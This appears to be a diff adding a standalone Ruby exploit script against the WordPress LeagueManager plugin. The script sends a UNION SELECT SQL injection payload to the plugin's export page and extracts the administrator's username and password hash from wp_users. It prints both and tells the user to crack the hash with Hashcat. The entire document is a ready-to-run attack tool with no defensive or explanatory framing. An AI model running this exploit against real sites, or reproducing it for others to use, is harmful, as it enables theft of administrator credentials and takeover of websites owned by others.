@@ -1,0 +1,41 @@
+
+require 'net/http'
+require 'uri'
+
+if ARGV.length == 2
+  post_params = {
+    'league_id' => '7 UNION SELECT ALL user_login,2,3,4,5,6,7,8,'\
+    '9,10,11,12,13,user_pass,15,16,17,18,19,20,21,22,23,24 from wp_users--',
+    'mode' => 'teams',
+    'leaguemanager_export' => 'Download+File'
+  }
+
+  target_url = ARGV[0] + ARGV[1] + "/wp-admin/admin.php?page=leaguemanager-export"
+  
+  begin
+    resp = Net::HTTP.post_form(URI.parse(target_url), post_params)
+  rescue
+    puts "Invalid URL..."
+  end
+    
+  if resp.nil?
+    print_error "No response received..."
+
+  elsif resp.code != "200"
+    puts "Page doesn't exist!"
+  else  
+    admin_login = resp.body.scan(/21\t(.*)\t2.*0\t(.*)\t15/)
+  
+    if(admin_login.length > 0)
+      puts "Username: #{admin_login[0][0]}"
+      puts "Hash: #{admin_login[0][1]}"
+      puts "\nNow go crack that with Hashcat :)"
+    else
+      puts "Username and hash not received. Maybe it's patched?"
+    end
+  end
+else
+  puts "Usage: ruby LeagueManagerSQLI.rb \"www.example.com\" \"/wordpress\""
+end	
+
+
